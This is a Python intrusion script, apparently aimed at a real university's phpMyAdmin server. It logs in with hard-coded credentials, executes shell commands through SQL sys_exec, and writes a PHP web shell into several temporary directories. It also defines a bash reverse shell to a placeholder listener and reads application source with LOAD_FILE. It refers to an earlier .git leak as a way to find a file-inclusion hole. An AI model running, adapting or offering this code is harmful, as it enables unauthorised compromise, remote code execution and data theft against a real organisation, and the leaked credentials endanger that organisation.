#!/usr/bin/env python3
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")

# 方法1: 使用sys_exec执行反向shell
print("[*] 尝试反向shell...")
# 注意：需要替换为实际的监听IP和端口
reverse_shell_cmd = "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
# 这里先不执行反向shell，因为需要用户自己的IP

# 方法2: 使用sys_exec写入shell到临时目录，然后通过其他方式访问
print("[*] 写入shell到临时目录...")
temp_paths = [
    "/tmp/shell.php",
    "/var/tmp/shell.php",
    "/dev/shm/shell.php",
]

for temp_path in temp_paths:
    cmd = f"echo '<?php system($_GET[c]); ?>' > {temp_path}"
    sql = f"SELECT sys_exec('{cmd}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    # 检查文件是否创建
    check_cmd = f"ls -la {temp_path}"
    sql = f"SELECT sys_exec('{check_cmd}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    # 如果文件存在，尝试通过文件包含访问
    # 但需要先找到文件包含漏洞

# 方法3: 检查phpMyAdmin是否有eval或执行PHP代码的功能
print("[*] 检查phpMyAdmin功能...")

# 方法4: 通过phpMyAdmin的SQL执行，使用LOAD_FILE读取现有文件，然后修改
print("[*] 尝试读取现有PHP文件...")
sql = "SELECT LOAD_FILE('/var/www/html/enmeeting/addmeeting.php');"
sql_data = {"sql_query": sql, "db": "scmeeting"}
resp = session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data, verify=False)

# 查找文件包含漏洞
print("[*] 检查文件包含漏洞...")
# 如果之前的.git泄漏中发现了文件包含漏洞，可以包含我们写入的文件

print("[-] 继续尝试其他方法...")
